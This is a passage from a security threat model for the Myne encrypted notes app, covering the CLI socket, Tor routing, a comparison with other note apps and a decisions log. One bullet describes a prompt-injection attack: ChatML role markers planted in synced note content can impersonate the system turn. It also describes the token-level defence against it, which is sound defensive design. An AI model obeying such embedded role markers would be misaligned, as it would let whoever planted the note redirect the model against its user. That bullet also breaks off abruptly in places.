SYNC-14 (SYNC-V9, MYND-270):** transcribing an audio attachment is an explicit, per-attachment user action on the media file's *own bytes* (not ambient reading of note *content*) so the **library**-triggered transcribe was gated on `ai_enabled` **alone** (a library attachment may be embedded in several notes/folders, so its folder is ambiguous), analogous to how the explicit "insert into note" (SYNC-17) overrides the no-auto-write rule. **Amended 2026-07-30 (MYND-592):** speech-to-text now has its own `transcription_enabled` preference and is **not** gated on `ai_enabled` at all (it is a bundled-model product feature rather than part of the AI beta) and the **in-note** trigger no longer folds in `ai_excluded_folders` either, on the same reasoning that already exempted the library surface: a folder excluded from ambient AI *reading* says nothing about whether the user may transcribe a file they explicitly picked. This is a carve-out for an explicit user action, not a silent SYNC-14 violation.   - **Prompt injection / Special-Token Injection (STI): untrusted note content in the chat context.** The conversational AI chat (`conversational-ai-chat`, MYND-454) feeds **attacker-influenceable content into the model's context**: a note synced from a compromised device (A6-class) or an imported note is chosen by an attacker, and its bytes become RAG grounding chunks + prior-turn text in a multi-turn ChatML prompt. Left raw, an embedded `<|im_end|><|im_start|>system…` would close the current turn and impersonate the system/assistant role (the ChatML analogue of SQL injection). The defense is **"parameterize, don't escape"**: every untrusted span is tokenized with special-token parsing **disabled** (`tokenizers::Tokenizer::set_encode_special_tokens`), so ChatML control markers in note content become ordinary text tokens and can never be control tokens: only the trusted role scaffold the host emits is tokenized as special. Verified at the token-id level by a model-free test. The token-id test cannot be written for that path at all. **Amended again 2026-08-16 (myne-md/myne#529, agentic note editing): the no-tool-calling conclusion is superseded, and this is the load-bearing change.** The sentence this bullet used to end on was: *the model has no tool-calling and no egress of its own, its output is transcript text the host renders rather than a request the host makes, and SYNC-17 still forbids a note write without an explicit user action.* The first two clauses are now false. Locking the vault tears the socket down unconditionally, with no CLI-specific teardown path that could fall out of sync with it.

  **Everything stays inside TB2** (the user's device, kernel + user-space process) — unlike the browser clipper (TB10) or the `myne://` deep-link scheme, no separately-distributed artifact and no external sender is introduced; the sidecar ships inside the desktop bundle itself, from the same workspace and the same `Cargo.lock`, so it is the same artifact the user already chose to install rather than a second one they would have to judge. **Not "covered by the bundle's own signature", which this sentence said until 2026-08-25 and which does not exist** (entry 0534, §1 A9).

  **Bounds, stated plainly.** (1) There is **no identity-checking gatekeeper** — no paired token, no peer-PID check, no code-signature verification defends the socket, because each is defeated by construction by a program already running as the same OS user (confused deputy; full rationale in the decisions entry above). (2) The residual this leaves is: **while the door is open — `cli_enabled` true and the vault unlocked — any program running as the same OS user can drive the CLI and read everything in scope.** (3) `cli_excluded_folders` narrows "everything in scope", but the check runs **after decrypt** (a note's folder lives inside its encrypted frontmatter) — not a new leak, since the desktop can already decrypt and simply declines to hand the result onward, but it means the search index `vault.search` (`MYS1`) is itself not scope-aware and results must be filtered by folder on the way out rather than by querying a narrowed index. (4) `cli_enabled` is off by default and `DeviceLocal` (the `ai_enabled` precedent) — enabling it on one device does not open the door on any other. (5) Reads are the accepted residual; **delete is prohibited outright** over the socket, not merely undocumented, because reads are recoverable harm and deletes are not. A default-on rate limit (removable in Settings) is a slowdown against a runaway/hostile script, not a security control, and copy must not describe it as one.

- **The web client leaves a linkable `device_id` behind on a machine that may not be the user's (MYND-574 task 37; TB11).** The web client's bearer token is deliberately never persisted — it lives in RAM for the life of the Worker and closing the tab discards it, so no *credential* survives a session. Its `device_id`, however, **is** persisted, as plaintext `device_id_hex` in `sync-state.json` in the origin's OPFS. That is a choice, not an omission: session-scoping it too would mint a new device on every reload, landing the browser in "pending, awaiting approval from another device" every single time it is opened — fatal for a client with no second client of its own to approve from, and it would grow the account's server-side device roster by one row per tab open. The residual is that anyone who later reads that browser profile's storage can tell **that this profile enrolled against a Myne account**. It confers no access: the id names a registry row and authenticates nothing without the token, which is gone. It is not encrypted because a vault key would protect it from nobody — an adversary reading this origin's OPFS already sees the encrypted vault and its shape. The user-reachable answer is "sign out and erase this browser's copy", which removes the whole container including this file; the honest statement of the limitation is that a user who simply closes the tab has left the fact of enrolment behind, and the app does not say so in the moment. Native clients are unaffected — their equivalent lives in a directory the user owns on a machine they own. (`decisions.md` 2026-07-28.)

- **Tor routing mode reduces AS14 / A2 source-IP exposure and changes nothing else (MYND-650; desktop only, opt-in, off by default).** The desktop can route its entire sync egress — request/response, the SSE poke stream, and the first-connect pin capture — through a bundled [arti](glossary.md#arti-sidecar) Tor client running as a separate loopback SOCKS5 proxy process (`decisions.md` 2026-07-31). **What it changes:** the address the sync server observes (**AS14**) and could be compelled to disclose at connection time (**A2**) is a Tor exit node's rather than the user's, and an observer on the local network or at the ISP (**A3**-adjacent) no longer learns *which server* this device syncs with — the hostname is resolved remotely, inside the tunnel, never by the local resolver. It is a **client-side** reduction of what is exposed, not a change to any server behaviour or policy; the server's own no-IP-logging commitment is untouched and independent of it. **What it does not change — no adversary rating moves.** **A13** is exactly where it was: blob sizes and counts, push/pull timing, the version-vector's per-device push profile and the poke stream's presence signal all traverse the tunnel unaltered, and Tor adds no padding, no jitter and no cover traffic. **AS9** is a stable pseudonym the server sees on every sync, so an account's syncs remain linkable to each other across circuits and across days: this is **network-location privacy, never anonymity to Myne**, and copy may not say otherwise. On the hosted paid tier the payment-correlation placement recorded above is unaffected — a payment identity linked to an `account_number_hash` is not un-linked by changing the IP the sync arrives from. **Four residuals, stated rather than implied.** (1) Endpoints are ordinary clearnet hosts (no `.onion` in v0.1), so the **exit node terminates the TCP connection and sees the destination**; it sees ciphertext-under-TLS, but it sees *where*. (2) That position makes the one accept-any-certificate handshake in the client — TOFU pin capture — a MitM the exit *occupies* rather than has to reach, which is why enrollment over Tor requires the user to supply the expected certificate fingerprint out-of-band **before** the socket opens, and why the captured fingerprint is never displayed for ratification; the compare is only as good as the channel the user got it from, which no code can check, and a user with no fingerprint at hand cannot enroll over Tor at all. (3) It is a **per-app proxy, not a system VPN**: only Myne's own sync egress is routed, so nothing else on the device is affected — including the one external egress Myne itself can trigger, an explicit-gesture "open this link in the browser", which leaves through the system browser and not through the tunnel. A user who reads the switch as device-wide protection is worse off than one who never enabled it, which is why the shipped copy says so under "What this doesn't hide". (4) The state directory that persists arti's entry guards is a device-local artefact recording that this machine used Tor (kept deliberately: re-picking guards every launch is the *less* private option). **The new surfaces, and what bounds them.** arti runs in **its own process**, holding no key material and no plaintext — a bug in it cannot reach the vault, and it never crosses TB3. Its **SOCKS5 door is unauthenticated loopback TCP**, and a TCP port carries no uid restriction by default on any of the three desktop platforms — only an OS sandbox that denies the process loopback changes that. While the mode is on, any process that finds the ephemeral port, **including one running as a different local user**, can use it as an open proxy: arbitrary outbound TCP with remote DNS through this user's circuits and guards, and abuse traffic sharing this user's guard and exit selection. No key material and no plaintext sits behind it, and this is the shape every Tor client ships — the system `tor` daemon's `SocksPort` and Tor Browser's `9150` are the same, and arti's own default is `Listen::new_localhost(9150)`. But it is **weaker than the other two local ingresses this app binds**, which are `0600` unix sockets (`cli.sock`, `clipper.sock`, both through `src-tauri/src/uds.rs`), and arti 2.5.0 does not let the host tighten it: `proxy` offers no SOCKS authentication — it consumes RFC 1929's username/password field as a stream-isolation token, never as a credential — and no unix-socket listener (`ListenItem` has only IP variants). A same-user peer is **A7** and already out of scope (§5); a different-uid peer is on no row of the A1–A15 roster at all, the same gap #343 observed for a co-resident account reading an exported `.txt`. The port is ephemeral and written nowhere (`port_info_file` is off and arti's own `Listening on …` line is dropped rather than mirrored), which raises the cost of finding it and bounds nothing else — the listener answers the 3-byte greeting without a credential, so a sweep of the ephemeral range is cheap. It is a workspace member that **nothing links**, so it stays outside `myne-desktop`'s `cargo tree -e normal` closure and the no-egress gate's crate-level property is unchanged by admitting arti — the scanned tree still carries no denylisted networked crate outside the documented sync-TLS allowlist. Its ~240 transitive crates do enter the shared `Cargo.lock` (**TB9**) — the largest single dependency admission in the project, and the first that *can* originate a network request — and bundling a Tor client makes Tor's security updates Myne's release responsibility (exact version pin; cadence ownership is an open question, `decisions.md` 2026-07-31). **Fail-closed, and honestly verified.** While the mode is on and the proxy is not bootstrapped, sync pauses and **no direct connection is attempted**; this is guarded both behaviourally (zero accepts on the endpoint's port across every non-ready state, with a control arm) and by a source ratchet over every outbound socket site. What CI proves is the SOCKS plumbing, the absence of a bypass, and the fail-closed framing — **not** that traffic physically traverses the real Tor network, which stays a documented manual check ([`dev/tor-verification.md`](dev/tor-verification.md)). The **web client has no such mode and never will** (a browser exposes no raw socket); its answer is Tor Browser ([`web-tor-browser.md`](web-tor-browser.md), which states what that does and does not buy). Mobile is deferred (MYND-652).

## 8. Comparison vs. Adjacent Products

A side-by-side comparison of how Myne's threat model differs from the closest alternatives. Drawn from each product's published documentation, source code, and public security incidents as of early 2026.

| Axis | Myne (v1) | Notesnook | Standard Notes | Joplin (E2EE on) | Obsidian Sync |
|---|---|---|---|---|---|
| Account identity | Self-generated number, no email | Email | Email | Email | Email |
| Server can read note content | No | No | No | No | No (claimed; closed-source client) |
| Server can read note titles | No | No | No | **Yes** (titles + IDs leak per issue #6456) | Unknown / closed source |
| Server can read folder/structure | No | Partial | Partial | Yes | Unknown / closed source |
| Server can read user-meaningful timestamps | Partial — `updated_at` no; `created_at` yes, via the UUIDv7 blob id (AS6) | Yes | Yes | **Yes** | Unknown / closed source |
| IP address logging | None | Per provider policy | Per provider policy | Per chosen sync target | Per provider policy |
| Open-source client | Yes | Yes | Yes | Yes | **No** |
| Open-source server | Yes | Yes | Yes (server-side) | Yes (Joplin Server) | **No** |
| Self-host option | Yes (first-class) | Yes | Yes | Yes | **No** |
| Independent published audit | Compensating controls only | Planned, none yet | Trail of Bits 2021 | Informal only | None published |
| Recovery model | Master password + 24-word BIP39 phrase | Email + master password | Master password (no recovery) | Master password (no recovery) | Master password + email |
| Encryption on by default | **Always** (no plaintext mode) | Always | Always | **Off by default** (must enable) | Yes |
| Plugin model | None in v1; future API capability-scoped | None | Editor swaps | Plugins yes, **broken on mobile** | Yes (full vault read access — privacy hole) |
| Markdown files plaintext on disk after decryption | **Yes** | No (proprietary store) | No | Sort of (SQLite + attachments) | Yes (no E2EE on disk) |

The differentiator is the combination, not any single column: **plain-markdown-on-disk + no email + encrypted titles + an encrypted `updated_at` + no IP logs + open-source full stack + first-class self-host**. No incumbent matches all of these. The timestamp column is stated as `updated_at` rather than "timestamps" because `created_at` rides the UUIDv7 blob id and is server-visible (AS6) — the row is still favourable against every comparator, and it has to be true.

## Decisions Log (this document)

A snapshot of choices made during the v0.1 draft. Mirrored to `decisions.md`.

**Resolved**

- 13 adversary classes catalogued (A1–A13) with explicit Strong / Mitigated / Best-effort / Out-of-scope status per class. The roster has grown since, and **§1 is the list of record** — read it rather than a count restated here; each extension has its own dated bullet below.
- **Browser-clipper channel (TB10 + A14), added 2026-06-20.** The keyless native-messaging clipper (`browser-extension` epic, MYND-442) extends the original A1–A13 / TB1–TB9 catalogue with **A14** (compromised-extension-build, 🔒 Mitigated) and **TB10** (browser↔desktop clip channel). Save-to-root + no-queue mean no vault structure (AS3/AS5) and no plaintext-at-rest ever reach the browser; the extension is keyless. (`decisions.md` 2026-06-20.)
- **Web bundle delivery channel (TB11 + A15), added 2026-07-26.** The Phase 3 web client (`phase3-web-client`) adds **A15** (hostile delivery of the client code itself, ⚠️ Best-effort, web only) and **TB11** (the origin serving the bundle), and splits two previously absolute rows **per client**: A11 stays 🛡️ Strong on native clients and becomes ⚠️ Best-effort on web, because a served bundle grants the operator exactly the extra access the Strong claim denies; A4 stays 🔒 Mitigated on native and becomes ⚠️ Best-effort on web, because a browser exposes neither TLS-exporter material nor certificate pinning to page JavaScript. A6 is noted weaker on web (page-scoped idle, throttled background timers). Filed as an adversary and a boundary rather than a §7 known limitation on purpose: filing a normative guarantee under "known limitations" downgrades it by bookkeeping instead of by decision. Self-hosting removes A15 for the self-hoster's own use and not for anyone else on their instance. (`decisions.md` 2026-07-26.)
- **Recovery-phrase phishing and extension DOM read (A18 + A19), added 2026-08-15.** `decisions.md` 2026-08-15, entry 0514, reverses rule 1 of the 2026-07-26 web capability set: phrase display (creation) and phrase entry (recovery) ship on the web client, while the phrase as a *device-enrolment credential* stays absent there. **A18** (credential phishing, ⚠️ Best-effort, web only) is filed because the old rule was not a control but a **structural inference** — no served page ever asked for the phrase, so any page asking was self-evidently fake — and shipping phrase entry spends that inference permanently. The attack needs no bundle compromise, so it is neither A15 nor A4, and none of the delivery-channel controls touch it; what remains is containment (one situation only, enforced by keeping enrolment's phrase grid out of the artefact) rather than prevention. **A19** (extension host permissions, ❌ Out of scope, web only) is filed separately because it is a different party with a different mechanism: an extension the user installed reads the DOM directly, which no CSP governs and no page can detect. A19 **predates** this change (the master password has always been typed into that DOM) and is named now because the phrase, the one credential no password change rotates, has joined it. Neither row is folded into A14, whose subject is Myne's own keyless clipper. (`decisions.md` 2026-08-15, entry 0514; issue `myne-md/myne#174`.)
- **AS6 split into `updated_at` and `created_at`, 2026-08-04 (amends the "Threat-model AS6 unchanged" clause of `decisions.md` 2026-05-07).** AS6 read "**Not visible.**" for both halves of the user-meaningful-timestamp asset. That is true of `updated_at`, which is sealed inside the AEAD envelope, and false of `created_at`, which has no encrypted carrier at all: a note's creation time is the timestamp embedded in its UUIDv7, that UUID is its `.myn` filename (`protocol.md` §9.1), and that same UUID is its sync wire key (`sync-protocol.md` §4.2) — so the server's per-vault index is a durable per-note creation-time series, compellable under A2. The at-rest half was never hidden (`protocol.md` §9.4 accepts the filename as plaintext); what was wrong was the claim that it stops at TB5. Amended rather than rewritten, per this log's own discipline: the AS6 row, the A1 and A2 mechanism rows, the §8 comparison row and its differentiator sentence, the "no server-visible timestamps" subsection heading, and a new §7 limitation. No adversary rating changes and no code changes — both alternatives (UUIDv4 ids; a keyed per-note sync-id) are major-version events, and §7 records why. (`decisions.md` 2026-08-04; issue `myne-md/myne#361`.)
- A1 (passive cloud) and A2 (compelled lawful access) are both Strong-guarantee — the architectural commitment is "the server cannot disclose what it does not possess".
- A12 (coerced user) is explicitly Out of scope in v1. A6 (unlocked stolen device) was Out-of-scope in the v0.1 draft and is now **🔒 Mitigated** by auto-lock on idle (`decisions.md` 2026-05-30 "Auto-lock on idle"; MYND-121 + MYND-122) — key-zeroize + best-effort open-note teardown, exposure-window-narrowing, not a Strong guarantee against forensic RAM capture.
- A7 (malware), A10 (state-level), A13 (traffic analysis) are Best-effort, with the limits documented to prevent marketing overreach.
- **AS6 — User-meaningful timestamps are encrypted.** Server uses an opaque per-note version counter (sync-internal monotonic integer) for conflict detection; conflict resolution happens on the client after decryption. This is a sync-protocol commitment.
- **AS14 — No IP logging.** Hard architectural commitment. Operational logs and abuse mitigation must function on per-account counters without IP addresses.
- TB5 — hosted sync and self-hosted sync are the **same** trust boundary. The protocol does not give the operator more access in either case.
- TB7 — **there is no auto-update**; this line said the opposite until 2026-08-15 (entry 0481 retracted the updater from the row itself and left this summary behind; entry 0496 closes it). An update is a download the user performs, checked against a minisign-signed hash list that is cross-published on a second origin.
- Compensating controls for the missing audit are codified: public spec, public threat model, public limits doc, reproducible builds (**web and server only** — not desktop, and not verifiable by an outsider while the source is private), minisign-signed and cross-published release hashes (**not** code-signed desktop installers), hash-pinned dependencies, SECURITY.md, security.txt, public bug bounty (acknowledgment-only acceptable in v1), spec-then-bounty cadence, pre-launch external review.
- **Hard line: no email recovery, ever.** If recovery-phrase UX support volume becomes unmanageable, the response is better in-product UX, not email-based recovery.

**Deferred**

- Argon2id parameter tuning on low-end mobile devices — decision blocked on Phase 3 mobile work. The cost *range* it must land inside is not deferred (`spec/protocol.md` §4.2.1); only the profile's position within it is.
- Blob-size padding / bucketing — deferred beyond v1; A13 remains Best-effort meanwhile.
- Sync-timing randomization / cover traffic — deferred beyond v1.
- Plausibly-deniable encryption against coerced-user (A12) — out of scope in v1; v2+ only with caution.
- Decrypted-memory wiping *beyond best-effort* for A6 (forensic-grade freed-page / swap / hibernation scrubbing) — deferred. Auto-lock on idle (`decisions.md` 2026-05-30) now delivers key-zeroize + best-effort open-note teardown (OS window-hide + WebView reload), moving A6 to 🔒 Mitigated; userspace-deterministic RAM scrubbing remains out of scope (A7/A10).

**Open risks**

- Release-signing key compromise (TB8) is the single largest unmitigated risk against A9. Holding the key offline and outside CI, separating build from signing, and cross-publishing the hashes on a second origin reduce it and do not eliminate it. **This line said "hardware-backed keys" until 2026-08-25 and there are none** (entry 0534). An Apple Developer ID, a Windows Authenticode certificate and a hardware token for the minisign key are all planned and none is bought: the project is in beta and this is deferred work rather than a decision against it, which is why the row stays ⚠️ Best-effort instead of moving to an accepted-risk list.
- Tauri's Cargo dependency surface plus the React UI layer's npm dependencies together form a non-trivial supply-chain attack surface; transitive compromise (A8) remains feasible despite hash pinning. The Vite + React choice (`decisions.md` 2026-04-26) keeps the npm side as small as practical, but it does not eliminate the surface.
- The "no formal audit" gap will widen if Notesnook publishes one before Myne does. Accept the risk; the compensating controls are the response.
- Self-host operator log policy is outside the protocol — documentation must surface the protocol-level vs. policy-level distinction so users understand which guarantees follow them when they switch operators.
